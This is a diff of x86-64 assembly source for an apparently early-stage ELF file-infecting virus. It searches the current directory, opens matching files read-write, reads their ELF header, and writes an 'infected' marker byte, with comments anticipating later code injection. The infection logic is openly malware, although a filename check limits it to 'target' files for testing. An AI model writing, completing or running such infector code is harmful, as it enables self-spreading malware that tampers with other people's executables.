@@ -29,21 +29,15 @@ global _start
 
 section .text
 
-infect:
+set_mark:
 	; # PROLOGUE
 	; # STACK
 	push rbp ; PUSH rbp IN STACK SO WE CAN KEEP A BACKUP OF OLD STACK BASE ADDRESS
 	mov rbp, rsp ; ALIGN RBP TO RSP
 
 	; # BODY
-	; # OPEN
-	mov rax, 2 ; OPEN KERNEL CODE
-	mov rdi, r10 ; PATHNAME
-	mov rsi, 2 ; O_RDWR
-	syscall
-	mov r9, rax ; KEEP OUR FD IN R9 REG
-
-	mov rdi, rax
+	; # LSEEK, OUR FD IS STORED IN r9
+	mov rdi, r9
 	mov rax, 8 ; LSEEK KERNEL CODE
 	mov rsi, 9 ; OFFSET OF OUR CHECKBYTE
 	mov rdx, 0 ; SEEK_SET
@@ -56,10 +50,38 @@ infect:
 	mov rdx, 1 ; 1 CHAR
 	syscall
 
-	; # CLOSE
+	; # EPILOGUE
+	; # STACK
+	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
+	pop rbp ; CLEAN THE STACK, REMOVE OUR RBP BACKUP NOW THAT WE REASSIGNED IT
+	ret ;
+
+infect:
+	; # PROLOGUE
+	; # STACK
+	push rbp ; PUSH rbp IN STACK SO WE CAN KEEP A BACKUP OF OLD STACK BASE ADDRESS
+	mov rbp, rsp ; ALIGN RBP TO RSP
+
+	; # RESET THE SEEK POINTER TO START OF FILE
 	mov rdi, r9
-	mov rax, 3
+	mov rax, 8 ; LSEEK KERNEL CODE
+	mov rsi, 0 ; OFFSET OF OUR CHECKBYTE
+	mov rdx, 0 ; SEEK_SET
 	syscall
+	; ###########################################
+
+	sub rsp, 4096 ; BUF
+
+	; # READ HEADER INFO
+	mov rax, 0 ; READ KERNEL CODE
+	mov rdi, r9 ; FD
+	lea rsi, [rsp] ; ADDR BUFFER
+	mov rdx, 0x40 ; SIZEOF(Elf64_Ehdr)
+	syscall
+	; #############################
+
+	call set_mark ; LET OUR INFECTED MARK
+
 	; # EPILOGUE
 	; # STACK
 	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
@@ -76,7 +98,7 @@ analyse:
 	; ; MAKE SPACE FOR BUFFER
 	sub rsp, 10
 	mov rsi, rsp
-	mov rdx, 10 ; READ 10 BYTES
+	mov rdx, 10 ; READ 10 BYTES TO REACH OUR INFECT MARK
 	syscall ;
 	;	0x7F	|	'E'	|	'L'	|	'F'	|	2 (64bits)
 	;	0			1		2		3	|	4
@@ -113,15 +135,16 @@ open_file:
 	mov rax, 2 ; OPEN KERNEL CODE
 	mov rdi, rdx ; PATHNAME
 	mov r10, rdx ; FOR LATER ON INJECT
-	mov rsi, 0 ; O_RDONLY
+	mov rsi, 2 ; O_RDWR
 	cmp word[rdi], 0x67726174 ; TESTING PURPOSES, WONT INFECT ALL FILES FOR NOW
 							  ; CHECKING FOR BEGINNING "targ" IN FILENAME
 	jne _prologue ; IF NOT "target" FILE, SKIP
 	syscall
 	; # ANALYSE FILE
 	cmp rax, 0 ; CHECK IF FD > 0
-	jbe _prologue
+	jb _prologue ; IF < 0 RET
 	push rax
+	mov r9, rax ; KEEP OUR FD IN R9 REG
 	call analyse
 	; #
 	; # CLOSE
@@ -246,6 +269,7 @@ _start:
 	push 0x2E ; FOLDER TO PARSE '.'
 	lea rdi, [rsp] ; GET POINTER STACK ADDRESS FOR OUR PATHNAME
 	call search
+	; # PARSE_DIR
 	call code
 	mov rax, 60
 	mov rdi, 0
